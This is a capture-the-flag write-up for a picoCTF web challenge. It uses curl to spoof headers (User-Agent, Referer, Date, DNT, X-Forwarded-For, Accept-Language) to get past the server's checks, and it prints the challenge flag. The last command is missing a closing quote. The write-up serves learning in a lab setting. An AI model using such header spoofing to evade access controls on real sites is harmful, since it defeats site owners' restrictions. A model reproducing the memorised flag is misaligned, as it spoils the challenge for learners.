Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:34588/

Visiting the site, we are faced with the message `Only people who use the official PicoBrowser are allowed on this site!`. That's easy to fix, we just have to send the header "User-Agent: PicoBrowser". Use the following `curl` command:

`curl http://mercury.picoctf.net:34588/ -H "User-Agent: PicoBrowser"`

Note that you can also choose to use BurpSuite or Postman or any other tool if you would like.

The returned page says `I don't trust users visiting from another site`. Ok, let's add the header `Referrer: http://mercury.picoctf.net:34588/`.

`curl http://mercury.picoctf.net:34588/ -H "User-Agent: PicoBrowser" -H "Referer: http://mercury.picoctf.net:34588/"`

This pattern continues on in the table below:

|Returned Message|Next Header|
|-|-|
|`Sorry, this site only worked in 2018`|`Date: Sun, 1 Jan 2018 00:00:00 GMT` (Random 2018 date)|
|`I don't trust users who can be tracked.`|`DNT: 1`|
|`This website is only for people from Sweden.`|`X-Forwarded-For: 31.15.32.0` (Random Swedish IP)|
|`You're in Sweden but you don't speak Swedish?`|`Accept-Language: sv` (`sv` is the language code for Swedish)|
|`What can I say except, you are welcome`|N/A, flag is given|

The last command:

`curl http://mercury.picoctf.net:34588/ -H "User-Agent: PicoBrowser" -H "Referer: http://mercury.picoctf.net:34588/" -H "Date: Sun, 1 Jan 2018 00:00:00 GMT" -H "DNT:1" -H "X-Forwarded-For: 31.15.32.0" -H "Accept-Language: sv`

flag: `picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_79e451a7}`
